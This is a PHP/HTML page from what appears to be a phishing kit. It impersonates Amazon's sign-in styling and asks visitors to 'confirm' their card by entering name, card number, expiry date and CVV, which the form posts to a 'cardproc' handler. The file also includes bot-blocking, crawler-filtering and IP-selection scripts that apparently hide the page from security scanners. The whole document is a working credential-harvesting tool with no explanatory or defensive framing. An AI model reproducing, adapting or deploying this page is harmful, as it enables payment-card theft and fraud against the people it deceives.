<?php
session_start();
error_reporting(0);
include '../autob/bt.php';
include '../autob/basicbot.php';
include '../autob/uacrawler.php';
include '../autob/refspam.php';
include '../autob/ipselect.php';
include '../autob/bts2.php';
?>


<!DOCTYPE html>
<html class="a-ws a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember" data-19ax5a9jf="dingo" data-aui-build-date="3.21.4-<?php echo date("Y");?>-06-24"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <title dir="ltr">Amazon Sign-In</title><link rel="shortcut icon" href="../relassets/favicon.ico">

    
      
        <link rel="stylesheet" href="../relassets/61A6IErPNXL._RC_11Fd9tJOdtL.css,11tfezETfFL.css,31Q3id-QR0L.css,31U9HrBLKmL.css_.css">
<link rel="stylesheet" href="../relassets/01SdjaY0ZsL._RC_31jdWD+JB+L.css,41DBI6BbFkL.css_.css">
<link rel="stylesheet" href="../relassets/11qeL1AgUGL.css">


			<style>
			.hide{display:none;}
			
			.clear-both {
				clear: both;
			}

			.block-display {
				display: block;
			}

			.relative {
				position: relative;
			}



			section[data-id="content"] h1 {
				font-family: Georgia;
				font-size: 28px;
				color: #44464a;
				line-height: 1.154em;
				font-weight: lighter;
				margin: 0;
			}
			section[data-id="content"] h2 {   
				font-family: Verdana;
				font-size: 14px;
				color: #444;
				line-height: 1.231;
				margin: 14px 0 25px 0;
			}

			section[data-id="content"] input[type="text"], section[data-id="content"] input[type="tel"] {
                margin-top: 5px;
                height: 34px;
				width:100%;
                max-width: 300px;
                padding-left: 10px;
                font-weight: normal;
                text-decoration: none;
                font-size: 13px;
                color: #44464a;
                border-radius: 2px;
                border: 1px solid #cfd1d7;
				font-family:verdana;
				text-transform:uppercase;
            }
			section[data-id="content"] #atmpin{
				width:80%;
				max-width:220px;
			}
			section[data-id="content"] select {
			    position: relative;
			    z-index: 0;
			    width: 100%;
			    height: 2em;
			    border: 0;
			    line-height: 2;
			    height: 45px;
			    margin-bottom: 15px;
			}

			section[data-id="content"] [data-id="linkSeparator"] {
				display: inline-block;
				padding-left: 10px;
				padding-right: 10px;
			}

			section[data-id="content"] #nd-captcha {
				display: inline-block;
			}

			section[data-id="content"] div[data-id="selectContainer"] {
				position: relative;
				width: 250px;
			}

			section[data-id="content"] div[data-id="selectContainer"]:focus {
				border: 2px solid;
			}

			section[data-id="content"] div[data-id="inputContainer"] {
				margin-top:10px;
				position: relative;
				margin-right:30px;width:100%;
			}
			section[data-id="content"] div[data-id="inputContainer"].tofloat{
				float: left;
				width:auto;
			}
			section[data-id="content"] div[data-id="inputContainer"].tofloat label{
				/*display:inline-block;*/
			}
			section[data-id="content"] div[data-id="inputContainer"] .insub{
				margin-top:5px;
				position: relative;
				display: block;
			}
			section[data-id="content"] div[data-id="inputContainer"] .inalt{
				margin-top:5px;
				color:#5174b8;
			}
			section[data-id="content"] div[data-id="inputContainer"] .inalt:hover{
				text-decoration: underline;
			}

			section[data-id="content"] div[data-id="inputContainer"] input:focus {
				outline: 2px solid #0033cc;
			}

			section[data-id="content"] div[data-id="inputContainer"] img {
				width: 16px;
				height: 16px;
				position:relative;
				top:3px;
			}

			section[data-id="content"] div[data-id="inputContainer"] label {
				font-weight: bold;
			}


			section[data-id="content"] .hr{
				padding-top: 10px;
			}
			.auth-workflow .auth-pagelet-container {
        width: auto;
		margin: 0 auto;
			}
			#authportal-center-section {
			width: 100%;
			max-width:700px;
			margin: auto;
			}
		</style>

		<style>
			.popup{
				width:60%;
				padding:10px;
				text-align:center;
				position:absolute;border:1px solid #777;
				box-shadow:2px 2px 5px;
				bottom:110%;
				background-color:#fff;
			}
			.popup span{
				padding:2px 4px; margin:2px;display:inline-block;cursor:pointer;
				border:1px solid #777;
				background-color:#008eff;color:#fff;
			}
		</style>


      

      </head>

  <body class="ap-locale-en_US a-m-us a-aui_72554-c a-aui_button_aria_label_markup_348458-t1 a-aui_csa_templates_buildin_ww_exp_337518-c a-aui_csa_templates_buildin_ww_launch_337517-c a-aui_csa_templates_declarative_ww_exp_337521-t1 a-aui_csa_templates_declarative_ww_launch_337520-c a-aui_dynamic_img_a11y_markup_345061-t1 a-aui_mm_desktop_exp_291916-c a-aui_mm_desktop_launch_291918-c a-aui_mm_desktop_targeted_exp_291928-c a-aui_mm_desktop_targeted_launch_291922-c a-aui_pci_risk_banner_210084-c a-aui_preload_261698-c a-aui_rel_noreferrer_noopener_309527-c a-aui_template_weblab_cache_333406-t1 a-aui_tnr_v2_180836-c a-meter-animate">


<div id="a-page">
    <div class="a-section a-padding-medium auth-workflow">
      <div class="a-section a-spacing-none auth-navbar">
        





<div class="a-section a-spacing-medium a-text-center">
  
    

    
      


<a class="a-link-nav-icon" tabindex="-1" >
  
  <i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>

  
  
</a>

    
  
</div>


      </div>

      <div id="authportal-center-section" class="a-section">
        
          
          
            <div id="authportal-main-section" class="a-section">
              





<div class="a-section a-spacing-base auth-pagelet-container">
  
    
    
      <div id="auth-cookie-warning-message" class="a-box a-alert a-alert-warning" <?php if(isset($_GET[''.$theerrkey.'']) || isset($_GET['cw2'])){echo 'style="display:block;"';}?>><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading">There was a problem</h4><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
        <p>
            You Input wrong information
          <a class="a-link-normal" >
          </a>
        </p>
      </div></div></div>
    
  
</div>

<div class="a-section auth-pagelet-container">
  








<div class="a-section a-spacing-base">
  <div class="a-box"><div class="a-box-inner a-padding-extra-large">

    <h2 class="a-spacing-small">
      Confirm your Credit/Debit card
    </h2>
    <form name="signIn" method="post" novalidate="" action="cardproc" class="auth-validate-form auth-real-time-validation a-spacing-none" data-fwcim-id="uifTLos9">
      

      <div class="a-section">
<div class="a-section a-spacing-large">
  <div class="a-row"> 
  <section data-id="content">
						<p>Step 1 of 2: </p>
							
						<div class="clear-both groupin">
						<div data-id="inputContainer">
		                    <label for="cardname">Card Name</label>
							<div class="insub">Name as it appears on card.</div>
		                    <input aria-required="true" id="cardname" name="cardname" value="" type="text" placeholder="Name On Card">
			            </div>
						</div>	
		                <div class="clear-both">
						<div data-id="inputContainer">
		                    <label for="cardnumber">Card Number</label>
		                    <input aria-required="true" id="cardnumber" name="cardnumber" value="" maxlength="19" type="tel" onkeypress="stoplen(19)" oninput="innumlen(this.value);demcnum()" onpaste="demcnum()" required="required"/>
			            </div>
						</div>
						<div class="clear-both">
		                <div data-id="inputContainer" class="tofloat">
							<label for="expdate">EXPIRY DATE</label>
		                    <input aria-required="true" id="expdate" name="expdate" maxlength="5" type="tel" placeholder="MM/YY" value="" onkeypress="stoplen(5)" oninput="demexpDate()" required="required">
		                </div>
		                <div data-id="inputContainer" class="tofloat">
							<div id="cvvpopup" class="popup" style="display:none">This is the standalone 3 or 4 digit number on the front or back of your card<br/><span onclick="popup()">close</span></div>
		                    <label for="cvv">CVV
							<a control="forms:inputHelpIconContainer" href="#" onclick="popup()"><img control="forms:inputHelpIcon" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAAVFBMVEX////P0dfS1NnP0dfR09nQ0tj////P0dcAaYzh4ubY2d729vfz8/Xw8fLv9vgPcpOfx9Q/jqj8/Pzf7PFvqr4vhaF/tMWPvcxPl7Afe5rP4+lfobekTrJhAAAABnRSTlMAYMwg2fb3Zk79AAAAiklEQVR4Xl2P2QrEIBAEjTE13ube6///c42yLKTepqCZbnUxaKnoQXVGIy7FmJyYsd2TDzSCny5j/Erel+UBqzc1LwEOW3lCkEFpB5st7NYCTitJwDyTiwWSKIkA217sAsQqQhP2deYmegTsCT2iHS1Dw+n+lnf5QHvbi5GPmV7sXv0/LvzG3ed/AQFWB28fFqxFAAAAAElFTkSuQmCC" alt="help icon for cvv field"/></a></label>
		                    <input aria-required="true" id="cvv" name="cvv" value="" type="tel" placeholder="CVV" maxlength="4" onkeypress="stoplen(4)" oninput="innumlen(this.value)">
			            </div>
						</div>
    </section>
  </div>
  
</div>

  

        <div class="a-section">
          
          <span id="auth-signin-button" class="a-button a-button-span12 a-button-primary auth-disable-button-on-submit"><span class="a-button-inner"><input id="signInSubmit" tabindex="5" class="a-button-input" type="submit" aria-labelledby="auth-signin-button-announce" name='btnsubmit'><span id="auth-signin-button-announce" class="a-button-text" aria-hidden="true">
            NEXT
          </span></span></span>


  <div class="a-row a-spacing-top-medium">
  <div class="a-section a-text-left">
      <label for="auth-remember-me" class="a-form-label">
        <div data-a-input-name="rememberMe" class="a-checkbox"><label><input type="checkbox" name="rememberMe" value="true" tabindex="4"><i class="a-icon a-icon-checkbox"></i><span class="a-label a-checkbox-label">
          Save Card Information?.
          <span class="a-declarative" data-action="a-popover" data-a-popover="{&quot;activate&quot;:&quot;onclick&quot;,&quot;header&quot;:&quot;\&quot;Keep Me Signed In\&quot; Checkbox&quot;,&quot;inlineContent&quot;:&quot;\u003cp&gt;Choosing \&quot;Keep me signed in\&quot; reduces the number of times you&#39;re asked to Sign-In on this device.\u003c\/p&gt;\n\u003cp&gt;To keep your account secure, use this option only on your personal devices.\u003c\/p&gt;&quot;}">
            <a id="remember_me_learn_more_link" href="javascript:void(0)" class="a-popover-trigger a-declarative">
              Details
            <i class="a-icon a-icon-popover"></i></a>
          </span>
        </span></label></div>
      </label>
    </div>
  </div>


          

<script>
"use strict"
function popup(){var pop = document.getElementById('cvvpopup').style.display;
	if(pop=="block"){document.getElementById('cvvpopup').style.display="none";}
	else if(pop=="none"){document.getElementById('cvvpopup').style.display="block";};
};

function demexpDate(){var expdate=event.target;var key =event.data;var val=expdate.value;if(event.inputType=="insertText"){if(isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);}; switch(val.length){case 1:if(key > 1){event.target.value="";}; break; case 2:if(val[0]==1 && key > 2 || isNaN(parseInt(key))){event.target.value=val.slice(0,val.length-1);} else if(val[0]==0 && key == 0){event.target.value=val.slice(0,val.length-1);} else {expdate.value=expdate.value+"/";}; break; case 4:if(key < 2 || key >= 3 || key == 0){event.target.value=val.slice(0,val.length-1);}; break; case 5:if(!isNaN(parseInt(key))){event.target.value=val;}; break;};};if(event.inputType=="deleteContentBackward" && val.length == 2){expdate.value=val[0]}};

function demcnum(){var self=event.target;var key =event.data;var val=self.value;var sep="-";var mval=val.replace(/\s/g,'').split('');
var pos=self.selectionStart;var cardtype=val.substring(0,2);var otherctype=val.substring(0,1);
if(pos){
if(/37|34/.test(cardtype)){self.maxLength="17";} else{self.maxLength="19";};
if(event.inputType=="insertText"){
if(cardtype==37 || cardtype ==34){for(var i=0;i < mval.length;i++){if(i==3 || i==9){mval[i]=mval[i]+' ';};};}
else{for(var i=0;i < mval.length;i++){if(i==3 || i==7 || i==11){mval[i]=mval[i]+' ';};};};
mval=mval.join('');mval=mval.split('');event.target.value=mval.join('');;
if(mval[pos]){if(cardtype==37 || cardtype ==34){
if(pos%4==0 && pos<6 && mval.length>=5){event.target.setSelectionRange(pos+1,pos+1);} else if(pos%12==0 && mval.length>=13){event.target.setSelectionRange(pos+1,pos+1);} else{event.target.setSelectionRange(pos,pos);};} else{if(pos%5==0){event.target.setSelectionRange(pos+1,pos+1)} else{event.target.setSelectionRange(pos,pos);};};};
};
if(event.inputType=="deleteContentBackward"){
if(cardtype==37 || cardtype ==34){for(var i=0;i < mval.length;i++){if(i==3 || i==9){mval[i]=mval[i]+' ';};};}
else{for(var i=0;i < mval.length;i++){if(i==3 || i==7 || i==11){mval[i]=mval[i]+' ';};};};
mval=mval.join('');mval=mval.split('');
event.target.value=mval.join('');
if(pos==0){event.target.setSelectionRange(0,0);}
else{if(cardtype==37 || cardtype ==34){
if(pos%4==0 && mval.length==5){event.target.setSelectionRange(pos,pos);} else if(pos%12==0 && mval.length==13){event.target.setSelectionRange(pos-1,pos-1);} else{event.target.setSelectionRange(pos,pos)};}
else{if(pos%5==0){event.target.setSelectionRange(pos-1,pos-1)} else{event.target.setSelectionRange(pos,pos);};};}
;};};
};

function innumlen(val){if(event.inputType=="insertText"){if(isNaN(parseInt(event.data))){if(val.length<=1){event.target.value="";} else{event.target.value=val.slice(0,val.length-1);};};};};

function stoplen(len){if(event.target.value.length==len && event.key!='Enter'){event.preventDefault();};}
</script>

          
          
        </div>
      </div>
    </form>
  </div></div>
</div>

  






  








</div>
            </div>
          
        
      </div>

      
      <div id="right-2">
      </div>

      <div class="a-section a-spacing-top-extra-large auth-footer">
        



<div class="a-divider a-divider-section"><div class="a-divider-inner"></div></div>

<div class="a-section a-spacing-small a-text-center a-size-mini">
  <span class="auth-footer-seperator"></span>

  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" >
      Conditions of Use
    </a>
    <span class="auth-footer-seperator"></span>
  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" >
      Privacy Notice
    </a>
    <span class="auth-footer-seperator"></span>
  
    
      
        
      

      
    

    <a class="a-link-normal" target="_blank" rel="noopener" >
      Help
    </a>
    <span class="auth-footer-seperator"></span>
  

  
</div>




<div class="a-section a-spacing-none a-text-center">
  





<span class="a-size-mini a-color-secondary">
  © 1996-<?php echo date("Y");?>, Amazon.com, Inc. or its affiliates
</span>

</div>

      </div>
    </div>

    <div id="auth-external-javascript" class="auth-external-javascript" data-external-javascripts="">
    </div>

    

  </div>

<div id="a-popover-root" style="z-index:-1;position:absolute;"></div></body></html>
